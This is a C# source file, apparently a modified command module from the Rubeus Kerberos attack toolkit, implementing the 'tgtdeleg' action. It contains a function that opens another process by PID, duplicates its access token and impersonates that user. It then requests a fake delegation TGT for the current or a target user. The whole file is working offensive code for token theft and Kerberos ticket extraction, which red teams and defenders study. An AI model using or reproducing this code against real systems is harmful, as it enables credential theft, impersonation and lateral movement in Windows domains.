using System;
using System.Collections.Generic;
using System.Security.Principal;

namespace Rubeus.Commands
{
    public class Tgtdeleg : ICommand
    {
        public static string CommandName => "tgtdeleg";

        private static bool _StealTokenAndImpersonate(uint pid)
        {
            IntPtr hToken = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;
        
            hProcess = Interop.OpenProcess(0x0400, false, pid);
        
            if (hProcess != IntPtr.Zero)
            {
                Interop.OpenProcessToken(hProcess, 983551, out hToken);
        
                if (hToken != IntPtr.Zero)
                {
                    Interop.DuplicateTokenEx(hToken, 983551, IntPtr.Zero, 2, Interop.TOKEN_TYPE.TokenImpersonation, out IntPtr NewToken);
        
                    if (NewToken != IntPtr.Zero)
                    {
                        Interop.ImpersonateLoggedOnUser(NewToken);
                        Console.WriteLine("[+] Impersonating {0}", WindowsIdentity.GetCurrent().Name);
                        return true;
                    }
                }
            }
        
            return false;
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: Request Fake Delegation TGT (current user)\r\n");
        
            if (arguments.ContainsKey("/pid"))
            {
                if (arguments.ContainsKey("/pid"))
                {
                    uint pid = Convert.ToUInt32(arguments["/pid"]);
        
                    if (!_StealTokenAndImpersonate(pid))
                    {
                        Console.WriteLine("Impersonation Failed.");
                        return;
                    }
                }
            }
        
            if (arguments.ContainsKey("/target"))
            {
                byte[] blah = LSA.RequestFakeDelegTicket(arguments["/target"]);
            }
            else
            {
                byte[] blah = LSA.RequestFakeDelegTicket();
            }
        }
    }
}
